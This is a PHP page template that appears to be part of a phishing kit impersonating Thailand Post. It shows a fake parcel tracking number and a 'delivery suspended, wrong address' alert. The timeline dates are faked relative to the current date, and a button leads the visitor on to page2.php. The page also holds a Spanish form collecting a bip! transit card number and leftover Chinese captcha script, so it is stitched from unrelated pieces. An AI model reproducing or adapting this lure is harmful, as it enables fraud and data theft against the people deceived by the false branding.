<?php
include('header_.php');
?>
<!-- main Start -->
<style>
  .swiper_slider {
    padding: 10px 15px 35px 15px;
    height: 200px;
  }

  .swiper-slide img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
  }

  .swiper {
    width: 100%;
    height: 100%;
  }


  .swiper-button-next:after,
  .swiper-rtl .swiper-button-prev:after {
    content: 'next';
    font-size: 19px;
    font-weight: bold;
    color: white;
  }

  .swiper-button-prev:after {
    content: 'prev';
    font-size: 19px;
    font-weight: bold;
    color: white;
  }

  .swiper-button-next,
  .swiper-button-prev {
    background-color: transparent !important;
  }

  span.swiper-pagination-bullet.swiper-pagination-bullet-active {
    background-color: #ff3333;
  }

  .swiper-button-next {
    height: 100%;
    width: 70px;
    position: absolute;
    top: 10%;
    right: -2%;
    background-image: linear-gradient(to right, rgba(0, 0, 0, .0001) 0, rgba(0, 0, 0, .5) 100%);
  }

  .swiper-button-prev {
    height: 100%;
    width: 70px;
    position: absolute;
    top: 10%;
    left: -2%;
    background-image: linear-gradient(to right, rgba(0, 0, 0, .5) 0, rgba(0, 0, 0, .0001) 100%);
  }

  .swiper-horizontal>.swiper-pagination-bullets,
  .swiper-pagination-bullets.swiper-pagination-horizontal {
    Left: 21%;
    width: 60%;
  }
  .postal_icon .postal_img {
    width: 47px;
    height: 40px;
  }
</style>
<div id="center" class="main innerpage">
  <div class="swiper_slider">
    <div class="swiper mySwiper">
      <div class="swiper-wrapper">
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_1.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_2.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_3.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_4.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_5.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_6.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_7.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_8.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_9.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_10.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_11.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_12.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_13.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_14.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_15.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_16.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_17.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_18.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_19.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_20.webp" alt="Slide image"
            class="slider-image">
        </div>
        <div class="swiper-slide"><img src="<?php echo $folder_path;?>/assets/images/img/slider_img_21.webp" alt="Slide image"
            class="slider-image">
        </div>
      </div>
      <!-- <div class="swiper-pagination"></div>-->
      <div class="swiper-button-next"></div>
      <div class="swiper-button-prev"></div>
      <div class="swiper-pagination"></div>
    </div>
  </div>
  <div class="old_code_wrap">
    <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
    <!-- photoblock start-->
    <section class="section col-12 photoblock2 no-print"
      style="background-image: url(/images/photoblock_inbg.png) !important;">
    </section>
    <!-- photoblock end-->
    <div class="container-fluid px-4">
      <!-- h1節點 -->
      <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no Pagados
      </h1>
      <!-- aP Start -->
      <section class="ap">
        <!-- searchform start -->
        <div class="searchform">
          <div class="login-form">
            <div class="tab-headers clearfix">
              <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
              <!-- <h2 class="tab-header-item pull-right" data-tab="testform">Carga bip!QR</h2>   -->
            </div>
            <div class="tab-container">
              <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate
                class="active tab-content">
                <div class="form-group">
                  <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i></legend>
                  <input type="text" placeholder="Ej: 123456789" name="username" required>
                </div>
                <div class="form-submit">
                  <button type="submit" class="btnSubmit btn" name="submit" id="submit">Continuar</button>
                  <center>
                    <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y
                        condiciones</b>.</span>
                  </center>
                </div>
              </form>
              <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                <p>empty</p>
              </form>
            </div>
          </div>
        </div>
      </section>
    </div>
  </div>
  <div class="container-fluid px-4">
    <section class="ap">
      <div class="row only_mobile">
        <div class="card_wrap">
          <div class="top_card">
            <div class="id_main">
              <span><img src="<?php echo $folder_path;?>/assets/images/logo/logo.webp" class="mb-5" style="width: 150px;"> </span>
              <div class="top_card_left">
                <h4>100987050072TH</h4>
                <p class="short_id">หมายเลขการติดตาม</p>
              </div>
            </div>
            <p style="color: red" class="like_viewmore">หยุดการส่งมอบ</p>
          </div>
          <div class="bottom_card">
            <p class="card_tag">ไปรษณีย์ไทย</p>
            <p class="post_date_card"><?php echo $globalDate; ?></p>
          </div>
        </div>
      </div>


      <div class="card mt-5 border-0 border-bottom border-secondary pb-5">
            <div class="card-body p-0">
                <h4>แพคเกจได้ถูกส่งกลับไปยังศูนย์จัดส่ง ที่ใกล้ ที่สุด</h4>
                <p>บรรจุภัณฑ์รอการจัดส่งอีกครั้ง</p>
                <p class="fw-bold mt-5" style="font-size: 15px;">รายละเอียด: สถานะของพัสดุผิดปกติ

<p>
                <div class="progress mt-4">
                    <div class="progress-bar progress-bar-part1" role="progressbar" style="width: 33%;">
                        <i class="fa-solid fa-chevron-right fa-chevron-right-1"></i>
                    </div>
                    <div class="progress-bar progress-bar-part2" role="progressbar" style="width: 33%;">
                        <i class="fa-solid fa-chevron-right fa-chevron-right-2"></i>
                    </div>
                    <div class="progress-bar progress-bar-part3" role="progressbar" style="width: 34%;">
                        <i class="fa-solid fa-chevron-right fa-chevron-right-3"></i>
                        <i class="fa-solid fa-circle-exclamation fa-circle-exclamation-3"></i>
                    </div>
                </div>
                <p class="fw-bold" style="font-size: 15px;float:right;">น้ำหน: 1.3KG<p>
            </div>
      </div>


      <div class="time_line_wrap only_mobile">
        <div class="time_line one">
          <div class="left-green first-green">
            <div class="for_color">
              <p><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -1 DAY +2 HOURS'));?> <br/>
                09:52
              </p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">ที่อยู่ผิดพลาด พัสดุถูกส่งกลับไปยังศูนย์จัดส่งเพื่อความปลอดภัยชั่วคราว
            <p>
            <p class="bottom_color">รออัปเดต ที่อยู่ และส่งอีกครั้ง
            <p>
          </div>
          <div>
          </div>
        </div>
        <div class="time_line">
          <div class="left-green">
            <div class="for_color">
              <p><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -2 DAY +1 HOURS'));?> <br/>
                15:17
              </p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">บรรจุภัณฑ์มาถึงพื้น ที่เป้าหมายแล้วเตรียมพร้อม ที่จะรับ และส่งมอบ
            <p>
            <p class="bottom_color">คนส่งของพร้อมแล้ว
            <p>
          </div>
          <div>
          </div>
        </div>
        <div class="time_line">
          <div class="left-green">
            <div class="for_color">
              <p><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -3 DAY +3 HOURS'));?> <br/>
                18:21
              </p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">พัสดุถูกขนส่งไปยังจุดหมายปลายทาง
            <p>
            <p class="bottom_color">เสร็จสิ้นการตรวจสอบความปลอดภัย
            <p>
          </div>
          <div>
          </div>
        </div>
        <div class="time_line">
          <div class="left-green">
            <div class="for_color">
              <p><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -4 DAY +5 HOURS'));?> <br/>
                10:13
              </p>
            </div>
          </div>
          <span class="time_row_line"></span>
          <div class="right-red">
            <p class="top_title_ps">ได้รับพัสดุแล้ว และทำการลงทะเบียนให้เสร็จ
            <p>
            <p class="bottom_color">เตรียมพร้อมสำหรับการตรวจสอบความปลอดภัยของพัสดุ
            <p>
          </div>
          <div>
          </div>
        </div>

      </div>
      <div class="message_expert only_mobile">
        <div class="sub-title alrt-modify py-5">
          <!-- <img src="/images/alert3.png"> -->
          <h2 class="title"><i class="fa-solid fa-circle-exclamation icon-alert me-2"></i>แพคเกจถูกระงับการส่งมอบ</h2>
          <p class="title-text">เนื่องจาก ที่อยู่ถนนผิดพลาดแพคเกจจึงไม่สามารถจัดส่งได้อย่างถูกต้องจึงได้ส่งกลับไปยังศูนย์จัดส่ง ที่ใกล้ ที่สุด<strong></strong></p>
          <p class="title-text">ไปรษณีย์ไทย: อัปเดต ที่อยู่ ที่ถูกต้องโดยเร็ว ที่สุดเพื่อให้เราสามารถส่งพัสดุของคุณได้อย่างถูกต้อง<strong></strong></p>
        </div>
      </div>
      <div class="button_block only_mobile">
        <a href="page2.php"><button class="button_next">ทำต่อไป</button></a>
      </div>

    </section>
    <!-- aP End -->
    <script>
      function checkForm() {
        var canGo = true;
        var custno = $("#custNo").val();
        if (custno === "") {
          $("#custNoError").show();
          canGo = false;
        }
        var answer = $("#answer").val();
        if (answer === "") {
          $("#answerError").show();
          canGo = false;
        }
        return canGo;
      }

      function errorNoticeDisplay(fieldName, noticeWarning) {
        $("#" + fieldName + "Error").show();
        $("#" + fieldName + "ErrorWarning").text(noticeWarning);
      }

      function sendEmailCaptcha() {
        var returnValue = true;
        if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
          errorNoticeDisplay('email', '請輸入Email 帳號');
          returnValue = false;
        } else {
          //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
          var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
          if (patternEmail.test($("#email").val()) == false) {
            errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
            returnValue = false;
          } else {
            patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
            if (patternEmail.test($("#email").val().toLowerCase()) == true) {
              errorNoticeDisplay('email',
                '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
            }
          }
        }
        if (returnValue) {
          $.ajax({
            url: "/captcha/sendCaptcha",
            type: "get",
            data: {
              "email": $("#email").val()
            },
            success: function (response) {
              $('#modal1').hide();
              $('.modal_overlay').hide();
              if (response) {
                swal("驗證碼已寄出，請至電子郵件信箱收信。");
              } else {
                swal("驗證碼已過期，請刷新驗證碼。");
              }

            },
            error: function (response) {
              swal("驗證碼已過期，請刷新驗證碼。");
            }
          });
        }
      }

      $(function () {

        $(".tab-header-item").on("click", function (e) {
          e.preventDefault();
          $(".tab-header-item").removeClass("active");
          $(this).addClass("active");

          var data_tab = $(this).attr("data-tab");
          $(".tab-content").removeClass("active");
          $("#" + data_tab).addClass("active");
        });

        $('#custNo').click(function () {
          $('.annotation').show();
          $("#answer").val("");
        });

        $('#answer').focus(function () {
          $("#answer").val("");

        });
        $('#answer').keyup(function () {
          var ans = $("#answer").val();
          $("#answer").val(toASCII(ans));
        });

      });
    </script>
  </div>
</div>

<script>
  var swiper = new Swiper(".mySwiper", {
    // loop: true,
    navigation: {
      nextEl: ".swiper-button-next",
      prevEl: ".swiper-button-prev",
    },
    pagination: {
      el: ".swiper-pagination",
    }
  });
</script>
<?php include('footer_.php'); ?>
